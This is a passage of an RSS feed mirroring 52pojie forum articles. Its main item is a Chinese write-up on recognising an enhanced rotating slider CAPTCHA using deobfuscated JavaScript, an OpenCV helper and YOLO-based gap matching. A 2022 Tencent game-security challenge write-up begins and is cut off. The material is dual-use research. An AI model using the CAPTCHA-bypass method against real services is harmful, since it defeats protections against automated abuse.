24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1904733-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Thu, 28 Mar 2024 14:42:44 +0800</pubDate>
<pubDate>Thu, 28 Mar 2024 14:42:44 +0800</pubDate>
</item>
<item>
<title>[验证码识别]某盾滑块验证码增强版的识别</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140373&amp;idx=1&amp;sn=83e93cad7c5a97819f3ba2cf98f4ea03&amp;chksm=bd50a1418a2728571c78c36f8f36dbf500fb45939cfaa1e1c9c5e7b22d8fb8556abe3f5ed890&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140373&amp;idx=1&amp;sn=83e93cad7c5a97819f3ba2cf98f4ea03&amp;chksm=bd50a1418a2728571c78c36f8f36dbf500fb45939cfaa1e1c9c5e7b22d8fb8556abe3f5ed890&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[
<div> - 最近，某盾推出了增强版验证码，其中滑块移动轨迹是条弧线，且会旋转，通过attrs值控制移动和旋转方式。<br>
- 滑块移动轨迹通过控制台调试可以观察到，attrs值影响滑块移动和旋转，如attrs小于0时以右上角为中心点进行旋转。<br>
- 滑块移动轨迹算法通过代码分析得到，可以计算滑块的偏移量和旋转角度。<br>
- 实现缺口识别的方案包括旋转模板匹配、目标检测+旋转模板匹配、目标检测+滑块轨迹位置匹配和置信度比较。<br>
- 通过计算滑块轨迹点和缺口中心点的最小距离，可以匹配正确的缺口，选择置信度最高的缺口作为目标。<br>
- 进行目标检测需要训练数据集并合理选择训练数量，训练方法可以参考作者之前的文章。<br>
- 欢迎讨论和分享更好的识别方法。<br> <div>
<p>
原创 <span>吾爱pojie</span> <span>2024-03-27 16:38</span> <span style="display: inline-block;">北京</span>
</p>

<p>本文章所有内容仅供学习和研究使用，本人不提供具体模型和源码。若有侵权，请联系我立即删除！维护网络安全，人人有责。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=a053cefe&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCZfAJBBxfTToc6iaPupjmEgPia0RE75sVSVAjiaicCQaBZgDeiamHQttrVGw%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>s1lencee</strong></p><p style="line-height: normal; margin-bottom: 0px;"><span></span><br /></p><blockquote><h4 style="margin-bottom: 16px; font-size: 1em; font-weight: 600; line-height: 1.25;">本文章所有内容仅供学习和研究使用，本人不提供具体模型和源码。若有侵权，请联系我立即删除！维护网络安全，人人有责。</h4></blockquote><hr /><h2>前言</h2><p>最近，某盾新推出了增强版验证码，其中滑块的增强版比较新颖（或许是我见识少，我见过百度类似的，但不是滑块）。</p><p><img border="0" height="326" src="https://https://wechat2rss.xlab.app/img-proxy/?k=2aa25fa7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCCShWNAJAMI65vsibdLCqccsHAxF4Hlkcz2rlQdX2ic1pGP3Yaon4OEGw%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="482" /></p><p><br /></p><p>与传统滑块不同的是，该滑块的移动轨迹是条弧线，且还会旋转，并且两个缺口的形状相同，这就排除了传统的cv2模板匹配识别缺口的方式。</p><h2>目录</h2><ul><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">滑块移动曲线研究</h3></li><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">还原滑块移动曲线</h3></li><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">缺口识别的方案</h3></li><li style="margin-left: 2px;"><h3 style="margin-bottom: 16px; font-size: 1.25em; font-weight: 600; line-height: 1.25; border-bottom: 2px solid rgb(204, 204, 204);">匹配缺口</h3></li></ul><h2>滑块移动曲线研究</h2><p>和非增强版滑块不同的是，该滑块接口新返回了一个值<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>，并且每次返回的值都不同</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">{<br />    "attrs": [<span style="color: rgb(255, 115, 253);">0.20475486292799452</span>],<br />    ...<br />}</code></pre><p>而且每次滑块旋转角度和偏移位置都不同，因此有理由怀疑滑块的移动轨迹和该值有关。</p><p>我们现在开始分析滑块是怎么移动和旋转的，通过控制台给滑块图片的CSS加上边框显示，就可以明显看出滑块的移动。</p><p style="text-align: left;"><img class="rich_pages wxw-img js_insertlocalimg" src="https://https://wechat2rss.xlab.app/img-proxy/?k=f5e6dd89&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCYrA4vhLSicsEhQuEPBFcjial3eU8GMkJp96vNxrzwRwwY1aALNc22zeA%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" /></p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1457cb40&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCX1SOyAA3DIbafic8mI9VFhZVAOuxxeByHicggp3XUaY5xGHffmLWDmXw%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="462" /></p><p><br /></p><p>结合<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>可以发现当<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>小于0时，是以滑块图片的右上角为中心点进行旋转加向右偏移，反之则以右下角为中心点。</p><p>为了验证我们的猜想，我们可以查看它的js文件，以下是我经过反混淆后的代码</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">function</span> <span style="color: rgb(255, 255, 182);">updateJigsawRotateAndLeft</span>() {<br />    <span style="color: rgb(150, 203, 254);">var</span> E = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$el'</span>][<span style="color: rgb(168, 255, 96);">"offsetWidth"</span>]<br />        , w = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"$slider"</span>][<span style="color: rgb(168, 255, 96);">"offsetWidth"</span>]<br />        , Q = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"$jigsaw"</span>][<span style="color: rgb(168, 255, 96);">"offsetWidth"</span>]<br />        , J = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"restrict"</span>](<span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>], w - Q);<br />    <span style="color: rgb(150, 203, 254);">if</span> (<span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'ratio'</span>] = (E / <span style="color: rgb(255, 115, 253);">0x2</span> - Q) / E,<br />        <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">"attrs"</span>]) {<br />        <span style="color: rgb(150, 203, 254);">var</span> g0 = <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'attrs'</span>][<span style="color: rgb(255, 115, 253);">0x0</span>]<br />            , g1 = J * <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'ratio'</span>];<br />        <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>][<span style="color: rgb(168, 255, 96);">'style'</span>][<span style="color: rgb(168, 255, 96);">'left'</span>] = g1 + <span style="color: rgb(168, 255, 96);">'px'</span>,<br />            <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>][<span style="color: rgb(168, 255, 96);">'style'</span>][<span style="color: rgb(168, 255, 96);">'transform'</span>] = <span style="color: rgb(168, 255, 96);">'rotate('</span> + g0 * g1 + <span style="color: rgb(168, 255, 96);">'deg)'</span>,<br />            <span style="color: rgb(198, 197, 254);">this</span>[<span style="color: rgb(168, 255, 96);">'$jigsaw'</span>][<span style="color: rgb(168, 255, 96);">'style'</span>][<span style="color: rgb(168, 255, 96);">'transformOrigin'</span>] = g0 &gt; <span style="color: rgb(255, 115, 253);">0x0</span> ? <span style="color: rgb(168, 255, 96);">"bottom right"</span> : <span style="color: rgb(168, 255, 96);">"top right"</span>;<br />    }<br />}</code></pre><p>可以看到当g0也就是<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>大于0时，将滑块dom的style（也就是css）的<code style="font-family: SFMono-Regular, Consolas, ;">transformOrigin</code>设置为<code style="font-family: SFMono-Regular, Consolas, ;">bottom right</code>，并且还可以得知滑块旋转角度<code style="font-family: SFMono-Regular, Consolas, ;">rotate</code>由滑块偏移距离g1与<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>的值g0相乘得到</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4515d4f5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCCSB8OAWldr0Fsc7PDIAxJmuyypicGR8q3Q6yOd36AbfVzyaFQdNHwQA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="998" /></p><p><br /></p><p>查资料得知，<code style="font-family: SFMono-Regular, Consolas, ;">transformOrigin: bottom right</code>正是设置中心点为右下角</p><h2>还原滑块移动曲线</h2><p>再次观察可以发现，滑块的偏移量和下面滑条的偏移量是不相同的，研究上面的js可以发现，滑块的偏移量经过一些算法得到J，再计算就可以得到滑块的偏移量</p><p>在控制台上打上日志点，再和还原的算法结果对比</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=1144d70d&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCEqYjnbcDs8ZY5Q34vqqMncibJmQGSyiaibV6hwwf2pNoBwXcxbXstibElA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>可以看到，结果一样。</p><h2>缺口识别的方案</h2><p>我们的目标是获取每个缺口的位置和旋转的角度，才可以判断哪个是符合条件的缺口，例如我得到一个缺口的角度，可以反向计算出滑块的偏移量，然后和该缺口的位置匹配，那么该缺口就是目标。</p><h3>1.旋转模板匹配</h3><p>我刚开始采用了旋转模板匹配，也就是将滑块旋转，然后每次旋转都进行一次模板匹配，返回置信度最高的坐标和角度。</p><p>但是由于多个缺口的存在，即使取置信度最高的2个值，也不能保证能匹配成功，有时候甚至不能匹配到缺口</p><p>于是我弃用了这个方法</p><h3>2.目标检测 + 旋转模板匹配</h3><p>在某大佬的建议下，我使用yolov5先将滑块缺口切割出来，再对切割下来的图片进行旋转模板匹配</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=bfd9e235&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCPibfJZev0r3cfHR8EloQiaicGicwhVRQa8s1Dc1PCwOQsceUbUUnVAWJjA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="640" /></p><p><br /></p><p>由于具有针对性，该识别方案的准确率远远高于第一种，但是缺陷是，识别时间较久，且计算量较大</p><p>原因很简单，因为需要目标检测再加上匹配每一个角度和多个缺口图片，所以消耗时间高于第一种方案</p><h3>3.目标检测 + 滑块曲线经过位置 + 置信度比较</h3><p>最后我想出了另一种识别方案，既然识别缺口角度比较麻烦，那么能不能通过滑块的移动轨迹去匹配缺口呢？</p><p>再多次观察可以发现，滑块不是每次都经过两个缺口，能不能只算出经过的缺口就行了</p><p>步骤是这样的:</p><ul><li style="margin-left: 2px;"><p>通过<code style="font-family: SFMono-Regular, Consolas, ;">attrs</code>计算滑块移动曲线</p></li><li style="margin-left: 2px;"><p>使用yolo识别缺口位置</p></li><li style="margin-left: 2px;"><p>再通过三角函数计算去除空白背景的滑块轨迹（每个坐标点和旋转角度）</p></li><li style="margin-left: 2px;"><p>算出滑块轨迹和每个缺口的最小距离，再比较每个缺口的最小距离，距离最小的就是目标缺口</p></li><li style="margin-left: 2px;"><p>如果每个缺口的最小距离只差小于一定阈值，则使用距离每个缺口最小轨迹点的旋转角度去目标匹配得到置信度</p></li><li style="margin-left: 2px;"><p>置信度最高的缺口就是目标缺口</p></li></ul><p>为了方便，我画了一张图表示怎么算出滑块轨迹点</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=4366bcc7&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCyKKNiautLUlsdGkWfLXJByW56Z4LDQSKMviapfdsUibsBUTYyPXiaUgzZg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /></p><p>我总结了以下内容，需要三角函数的知识</p><ul><li style="margin-left: 2px;"><p>首先算出去除空白背景滑块的中心点，再得到<code style="font-family: SFMono-Regular, Consolas, ;">α</code></p></li><li style="margin-left: 2px;"><p>然后通过<code style="font-family: SFMono-Regular, Consolas, ;">β</code>和<code style="font-family: SFMono-Regular, Consolas, ;">α</code>算出<code style="font-family: SFMono-Regular, Consolas, ;">γ</code></p></li><li style="margin-left: 2px;"><p>通过<code style="font-family: SFMono-Regular, Consolas, ;">γ</code>算出<code style="font-family: SFMono-Regular, Consolas, ;">x2</code>和<code style="font-family: SFMono-Regular, Consolas, ;">y</code></p></li><li style="margin-left: 2px;"><p>滑块轨迹点 = (滑块宽度 + x1 + x2, y)</p></li></ul><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(150, 203, 254);">import</span> cv2<br /><br /><span style="color: rgb(150, 203, 254);">def</span> <span style="color: rgb(255, 255, 182);">get_slide_center</span>(image_path):<br />    <span style="color: rgb(168, 255, 96);">"""获取滑块中心点坐标, 不包含透明背景"""</span><br />    <span style="color: rgb(124, 124, 124);"># 读取图片</span><br />    image = cv2.imread(image_path, cv2.IMREAD_UNCHANGED)<br />    <span style="color: rgb(124, 124, 124);"># 提取Alpha通道</span><br />    alpha_channel = image[:, :, <span style="color: rgb(255, 115, 253);">3</span>]<br />    <span style="color: rgb(124, 124, 124);"># 寻找非零Alpha值的最小边界框</span><br />    _, thresh = cv2.threshold(alpha_channel, <span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">255</span>, cv2.THRESH_BINARY)<br />    contours, _ = cv2.findContours(thresh, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)<br />    x, y, w, h = cv2.boundingRect(contours[<span style="color: rgb(255, 115, 253);">0</span>])<br />    <span style="color: rgb(124, 124, 124);"># 裁剪图片</span><br />    <span style="color: rgb(150, 203, 254);">return</span> [int(w / <span style="color: rgb(255, 115, 253);">2</span> + x), int(h / <span style="color: rgb(255, 115, 253);">2</span> + y)]</code></pre><p>得到所有轨迹点后，绘制到背景图上查看结果</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=53dcf84e&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZL7D5zk4CeNMFf51zC4feBCsUh9daTCVE8EfItGdHa1c1pPfImWAkZtLmbVZEY7ldIsaRMLibRBWZQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="320" /></p><p><br /></p><p>接下来就是计算缺口图片中心点到轨迹线的最小距离，然后比较就行了</p><p>如果轨迹线经过了2个缺口的中心点，那么就可以根据轨迹点去旋转滑块图片再去匹配缺口图片，取置信度最高的即可</p><h2>总结</h2><blockquote><h4 style="margin-bottom: 16px; font-size: 1em; font-weight: 600; line-height: 1.25;">训练该缺口的目标检测我使用了500张图片的数据集，不过我认为300张就够了，具体怎么训练可以参考我之前的文章。</h4></blockquote><p>另外，我不是什么大佬，我只是站在了巨人的肩膀上</p><p>最后，如果大家有个更好的方法欢迎大家讨论！</p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 24px;"><strong><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; letter-spacing: 5px; text-align: start; background-color: rgb(255, 255, 255);">👆👆👆</span></strong></span><span style="background-color: rgb(255, 251, 0); font-size: 16px; letter-spacing: normal;"><strong><span style="text-align: start; font-family: Arial, sans-serif;"><span style="color: rgb(0, 0, 0); font-family: Verdana, Arial, Tahoma; font-size: 20px; letter-spacing: 5px; background-color: rgb(255, 255, 255);"></span><strong style="font-family: Tahoma, Helvetica, SimSun, sans-serif; letter-spacing: 0.544px;"></strong></span></strong></span></p><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">公众号<span style="color: rgb(255, 0, 0);"><strong>设置“星标”，</strong></span>您</span><span style="font-size: 16px; color: rgb(255, 0, 0);"><strong>不会错过</strong></span><span style="font-size: 16px;">新的消息通知<span style="color: rgb(247, 49, 49); font-family: Arial, sans-serif; font-size: 13px; text-align: start;"></span></span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;">如</span><strong style="font-size: 16px; letter-spacing: 0.544px;"><span style="color: rgb(255, 0, 0);">开放注册、精华文章和周边活动</span></strong><span style="font-size: 16px;">等公告</span></span></p><br /><p><span style="letter-spacing: normal;"><span style="font-size: 16px;"><br /></span></span></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><img class="rich_pages wxw-img" /></p><p style="display: none;"></p>



<p><a href="https://www.52pojie.cn/thread-1904971-1-1.html">阅读原文</a></p>
]]></content:encoded>
<pubDate>Wed, 27 Mar 2024 16:38:19 +0800</pubDate>
<pubDate>Wed, 27 Mar 2024 16:38:19 +0800</pubDate>
</item>
<item>
<title>2022腾讯游戏安全大赛复盘</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140353&amp;idx=1&amp;sn=ee512da957024b45e2e854aaee2725c0&amp;chksm=bd50a1558a2728434bb74fc90144a2573311afe7dbc9a664250f2f57163e533b07b0bcf40366&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140353&amp;idx=1&amp;sn=ee512da957024b45e2e854aaee2725c0&amp;chksm=bd50a1558a2728434bb74fc90144a2573311afe7dbc9a664250f2f57163e533b07b0bcf40366&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-03-25 18:17</span> <span style="display: inline-block;">北京</span>
</p>

<p>复盘一下2022的腾讯游戏安全比赛。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=711f4a16&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlq70wGgFCXjzel6Q1tSPC27hrlg7xWOWsmRr48hd5OJ0DW8tOR4KdTQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：</span>xia0ji233</strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p>复盘一下2022的腾讯游戏安全比赛。</p><h2>初赛</h2><h3>题目说明</h3><p>这里有一个画了flag的小程序，可好像出了点问题，flag丢失了，需要把它找回来。</p><p>题目</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=6cf23250&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRliclwthkflkWNUogJ3ic1CScTw23djdRBgdTUGGPZejr12AhClt1JGAjA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>找回flag样例：</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=51c977cd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlOZf7mDTNTk7kC1gyBwJ1e9Xv72w3gE3uL5aR3a8ticv4x9icZQRg2EKg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p><span style="font-weight: 700;">要求：</span></p><ol><li style="margin-left: 2px;"><p>不得直接patch系统组件实现绘制（如：直接编写D3D代码绘制flag），只能对题目自身代码进行修改或调用。</p></li><li style="margin-left: 2px;"><p>找回的flag需要和预期图案（包括颜色）一致，如果绘制结果存在偏差会扣除一定分数。</p></li><li style="margin-left: 2px;"><p>赛后需要提交找回flag的<span style="font-weight: 700;">截图</span>和<span style="font-weight: 700;">解题代码或文档</span>进行评分。</p></li></ol><p><span style="font-weight: 700;">评分标准：</span></p><p>根据提交截图和代码文档的时间作为评分依据。</p><h3>解题过程</h3><p>先打开所给的程序，发现输出 ACE 的 LOGO 过一会后会消失。</p><p>IDA，打开找到 WinMain 函数，找到消息循环函数，分析主体逻辑</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=0c321a95&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlxs5jGlpy9aRtFuohQOYZeTaicMZ7ic9ickAAcicwQvOvYKrXCwNbqicKkTQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>看到主体的函数</p><p><img border="0" class="rich_pages wxw-img" src="https://https://wechat2rss.xlab.app/img-proxy/?k=43b2beeb&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRl7OkicEvIT3uhiaayH58AEnqByEkjEzdGicbfT6tMTlEIicTq1sSlUrPwyA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto; display: inline;" /></p><p>有一个初始化的操作，会分配一片可读可写可执行（<code style="font-family: SFMono-Regular, Consolas, ;">#define PAGE_EXECUTE_READWRITE  0x40</code>）内存并将代码拷贝过去，主要有 <code style="font-family: SFMono-Regular, Consolas, ;">140005040</code> 和 <code style="font-family: SFMono-Regular, Consolas, ;">140006350</code> 两个地址的代码。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=a5fd5fe5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZKMGsozGdqnKZ3TA6NVHBRlIUQPWoELSKw96jGrmeJnQHzic5pCWkibgbgvkMvjgJdzia60MnZsPficFQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><p>第一段拷贝完成之后可以发现它 PATCH 了函数开头的几个字节，应该是防静态分析的，而且看字节大概是 <code style="font-family: SFMono-Regular, Consolas, ;">PUSH,POP</code> 指令。</p><p>下面可以看到记录了当前的时刻，如果发现起始时刻与当前时刻超过了 4000（4000MS）那么执行下面的指令，这里根据开始的运行大概能猜测出来应该就是停止绘制的代码了。</p><p><img border="0" 